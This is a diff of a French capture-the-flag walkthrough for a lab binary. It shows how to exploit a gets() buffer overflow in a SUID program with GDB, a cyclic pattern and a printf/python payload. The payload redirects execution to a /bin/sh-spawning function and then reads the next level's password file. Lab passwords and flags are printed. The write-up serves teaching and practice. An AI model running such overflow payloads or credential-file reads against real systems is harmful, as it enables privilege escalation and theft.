@@ -1,130 +1,110 @@
 # Level1 - Walkthrough
 
 ## Objectif
-Exploiter un buffer overflow pour obtenir le flag de level2.
+Exploiter un buffer overflow pour rediriger le flux d'exécution vers la fonction `run()`.
 
 ---
 
-## Étape 1 : Connexion
-```bash
-ssh level1@192.168.1.45 -p 4242
-# Mot de passe : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
-```
+## Étapes d'exploitation
 
----
-
-## Étape 2 : Reconnaissance
+### 1. Reconnaissance
 ```bash
 ls -la
-```
-
-Observer le binaire :
-```
--rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-```
-
-Tester le programme :
-```bash
-./level1
-# Entrer une chaîne courte, observer le comportement
+# -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+# ⚠️ Bit SUID actif → s'exécute avec les droits de level2
 
 ./level1
-1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890  # -> 100 caractères
+test
+# [rien ne se passe]
+
+python -c "print('A' * 100)" | ./level1
 # Segmentation fault → Buffer overflow détecté
 ```
 
----
-
-## Étape 3 : Copier le binaire et décompiler
-```bash
-# Sur votre machine locale
-scp -P 4242 level1@192.168.1.45:~/level1 ~/downloads/
-```
-
-Dans Ghidra :
-1. Importer `level1`
-2. Analyser le binaire
-3. Examiner la fonction `main` :
-```c
-   void main(void)
-   {
-     char local_50[76];
-     gets(local_50);
-     return;
-   }
-```
-4. Lister toutes les fonctions disponibles
-5. Décompiler la fonction `run` :
-```c
-   void run(void)
-   {
-     fwrite("Good... Wait what?\n", 1, 0x13, stdout);
-     system("/bin/sh");
-     return;
-   }
-```
-
----
-
-## Étape 4 : Trouver l'adresse de run
+### 2. Analyse GDB
 ```bash
 gdb level1
 (gdb) info functions
-# Résultat : 0x08048444  run
-
-(gdb) print run
-# Confirmer l'adresse : 0x08048444
 ```
 
----
+**Résultat :**
+```
+0x08048444  run
+0x08048480  main
+```
 
-## Étape 5 : Trouver l'offset
+**Fonction `run()` trouvée à : `0x08048444`**
 
-Dans GDB, tester l'offset :
-```gdb
+### 3. Déterminer l'offset
+
+#### Utiliser un pattern cyclique
+```bash
+gdb level1
 (gdb) run
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ^D
-# Si le crash montre EIP = 0x42424242 (BBBB), l'offset est de 80 octets
+
+Program received signal SIGSEGV
+(gdb) info registers eip
+# eip  0x37634136  → "6Ac7" en ASCII
 ```
 
----
-
-## Étape 6 : Construire le payload
-
-Structure du payload :
-- 76 octets de padding (buffer)
-- 4 octets de padding (EBP)
-- 4 octets : adresse de `run` en little-endian
-
-Adresse de `run` : `0x08048444`  
-En little-endian : `\x44\x84\x04\x08`
-
-Payload final :
+#### Trouver la position dans le pattern
 ```bash
-(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08'; cat) | ./level1
+# Chercher "6Ac7" dans le pattern → position 76
+
+# Vérification :
+(gdb) run
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
+^D
+(gdb) info registers eip
+# eip  0x42424242  → "BBBB" ✅
 ```
 
-Note : 76 'A' dans le printf ci-dessus (80 octets au total avec les 4 derniers 'A').
+**Offset = 76 octets**
 
----
+### 4. Conversion de l'adresse en little-endian
+```
+Adresse de run() : 0x08048444
+Little-endian    : \x44\x84\x04\x08
 
-## Étape 7 : Exploitation
+Calcul :
+  08 04 84 44  (paires)
+  44 84 04 08  (inversé)
+```
+
+### 5. Construction du payload
+```
+Structure : [76 octets padding] + [adresse de run]
+
+Payload : 'A' × 76 + '\x44\x84\x04\x08'
+```
+
+### 6. Exploitation
+
 ```bash
-level1@RainFall:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08'; cat) | ./level1
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+
+**Résultat :**
+```
 Good... Wait what?
-cat /home/user/level2/.pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+$ 
 ```
 
----
-
-## Étape 8 : Passer au niveau suivant
+### 7. Vérification
 ```bash
-exit
+$ whoami
+level2
 
-su level2
-# Mot de passe : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+$ id
+uid=2021(level1) gid=2021(level1) euid=2022(level2) egid=100(users)
+```
+
+### 8. Récupération du flag
+```bash
+$ cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
 ---
@@ -133,3 +113,8 @@ su level2
 ```
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
+
+## Type de vulnérabilité
+- Buffer overflow (CWE-120)
+- Use of dangerous function `gets()` (CWE-676)
+- SUID privilege escalation (CWE-250)
